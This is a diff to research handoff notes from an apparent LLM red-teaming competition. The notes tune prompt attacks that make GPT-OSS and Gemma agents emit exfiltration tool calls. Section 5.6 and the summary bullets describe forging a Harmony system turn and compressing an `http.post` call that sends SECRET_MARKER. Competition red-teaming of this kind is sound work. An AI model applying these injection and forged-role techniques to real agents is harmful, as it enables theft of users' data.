@@ -161,9 +161,11 @@ This section is the short handoff answer as of the latest local update.
 
 - Current confirmed public anchor: `55727872`, 112.970 public, GPT successive-halving selector plus Gemma R57.
 - No currently queued local result is proven better than that anchor. The syslow-fallback selector package is a clean ablation, not a local win. Expected public value is small, roughly negative to slightly positive unless the hosted selector fails closed in a way local tests do not expose.
+- Retire the earlier optimistic 116-123 public-score estimate for the already-tested GPT numeric/system-low/selector family. That estimate assumed local token and raw/s gains would transfer proportionally to the hosted T4 path. Hosted evidence did not support that: system-low transferred to 112.650, the successive-halving selector reached 112.970, but system-medium fell to 111.370 and bare-opaque tied 109.770. The current conversion lesson is that local exact-K8 plus fewer tokens is necessary but not sufficient.
 - The prepared syslow-fallback package changes only `GPT_DUPLICATE_K8_TEMPLATE` from `current_numeric_1_8` to hosted-proven `current_numeric_system_low`, while keeping numeric as a challenger. Local notebook/source hash: `9cefa6cbe289f922e8521a5436b03ca0fed740e2498c64e793d33877ed8a000e`.
 - The prepared GPT hedge N1/N2 packages are not public-score improvements. They are private-risk insurance only. The economics model estimates about `0.240` public leaderboard points lost per GPT hedge candidate because CONFUSED_DEPUTY K8 is far lower-density than EXFIL K8.
-- Negative or low-priority areas now include: prompt compression, no-final GPT, repeat-to-cap, cache-primed replay, late uniqueness, Gemma R57 intro compression, Gemma multi-message continuation, GPT 3x/4x/geometric tails, and public non-EXFIL predicate compounding.
+- Negative or low-priority areas now include: ordinary prompt compression, no-final GPT, repeat-to-cap, cache-primed replay, late uniqueness, Gemma R57 intro compression, Gemma multi-message continuation, GPT 3x/4x/geometric tails, and public non-EXFIL predicate compounding.
+- The only currently interesting short-horizon GPT idea is not URL compression anymore; it is parser-surface compression. Test whether GPT-OSS can be made to emit a shorter Harmony tool-call surface that the public SDK parser accepts, for example omitting `<|constrain|>json` or tightening `commentary to=...`. This must start with a zero-GPU parser/token enumerator and an immediate raw-generation kill check. Promote only if the shorter surface is parser-valid, preserves `http.post` arguments exactly, remains 100/100 exact K8 candidate-cold, and beats the hosted-proven exact family by a meaningful local margin.
 - The remaining gap to the top of the public leaderboard is unlikely to come from more selector-margin tuning. A meaningful jump probably requires a new primitive: a materially faster exact GPT K8/2xK8 path, a real Gemma throughput breakthrough, or a private-transfer mechanism that does not destroy public throughput.
 - New operational guardrail: `scripts/audit_kaggle_packages.py` inventories prepared `runs/kaggle-*` notebooks and reports embedded attack hashes, declared-source matches, current-source matches, and key constants. Use it before any manual or automated submission to avoid stale/wrong package duplication.
 
@@ -606,6 +608,27 @@ The interpretation is now positive but still guarded. Bare-opaque beat numeric a
 A wording-compression pass did not find a better replacement. The shorter `url is opaque ID; use exact strings.` form failed once at K6 in n=5 grouped. The `do not expand them into web addresses` form stayed exact but was slightly slower than full opaque in n=20 candidate-cold, 57.222 versus 57.396 raw/s. Keep the full opaque phrase until hosted data proves otherwise.
 
 Combining the successful opaque wording with the forged Harmony `Reasoning: low` system turn produced a strong local GPT duplicate arm: 5 x K8 at 61.967 raw/s grouped/warm and 20 x K8 at 63.824 raw/s candidate-cold. It also beat the current bare-opaque arm in the same n=20 candidate-cold run, 63.824 versus 62.773 raw/s. Because system-low role-token effects have had noisy hosted transfer, this arm remains an explicit-config/pending-ablation hypothesis rather than part of the narrowed next-submission selector.
+
+### 5.6 2026-08-24 open GPT parser-surface compression idea
+
+The remaining plausible GPT compression idea is lower-level than the prior prompt and URL screens. URL shortening has mostly been exhausted: numeric `"1"` to `"8"`, protocol-relative `"//1"` to `"//8"`, and opaque bare strings were tested, and only some variants stayed exact K8. The next question is whether the model has to generate the full canonical Harmony tool-call surface, or whether the SDK parser accepts a shorter surface that still produces the same `http.post` call.
+
+The hypothesis to test is parser-minimal output such as:
+
+```text
+<|channel|>commentary to=functions.http.post<|message|>{{"url":"1","data":"SECRET_MARKER"}}<|call|>
+```
+
+compared with the longer canonical form that may include extra header fields such as `<|constrain|>json`, canonical spacing, or analysis/tool-call scaffolding. This is different from the earlier failed tool-header prefill experiment: the candidate would ask GPT-OSS itself to generate one complete shorter parser-valid tool-call surface, not rely on a partial prefilled tool header that the runtime then completes incorrectly.
+
+The correct test order is:
+
+1. Zero-GPU parser enumerator: feed candidate surfaces directly into the exact SDK GPT-OSS/Harmony parser, require the parsed call name to be `functions.http.post`, require valid JSON args, require `data="SECRET_MARKER"`, and reject anything that changes the URL/data keys or normalizes into a blocked private-network target.
+2. Token/byte ranking: rank only parser-valid surfaces by generated-output length using the actual GPT-OSS tokenizer if it is available without loading the full model; otherwise use byte length as a first-pass proxy and defer promotion until token counts are measured.
+3. Raw-generation kill check: inspect exact-phrase GPT raw completions. If they already omit the suspected removable fields, this idea is exhausted. If they still emit avoidable header tokens, build a prompt arm that positively teaches the shorter grammar.
+4. Model gate: run candidate-cold GPT screens. Promotion requires 100/100 exact K8, zero parser drift, median completion tokens below the current exact-phrase family, and at least a meaningful local throughput margin before spending a hosted submission.
+
+Current status: this is an open research target, not an implemented improvement. It is the best short-horizon prompt-surface question left because it attacks decode tokens directly while staying inside the existing public-SDK legal tool-call path. It should still be killed quickly if parser inspection shows the canonical fields are mandatory or if raw generations already use the minimal accepted surface.
 
 ## 6. What worked
 
@@ -1326,6 +1349,7 @@ The immediate engineering plan should be:
 7. Preserve Gemma R57; change only one narrow variable at a time around that prompt family.
 8. Keep private-transfer work separate from public throughput optimization, and insert any future private hedge near the replay head only after assigning an explicit public-score budget.
 9. For public score, stop spending time on margin-only selector tuning unless a real local primitive first clears a meaningful gate. The next useful research target must be materially faster exact GPT K8/2xK8, a Gemma throughput breakthrough, or a credible private-transfer primitive.
+10. The next concrete GPT-side experiment to hand to 5.6 Pro is parser-surface compression: enumerate shortest SDK-parser-valid Harmony tool-call strings first, then only run model screens if the parser accepts a shorter surface that current raw generations do not already use.
 """
 
 
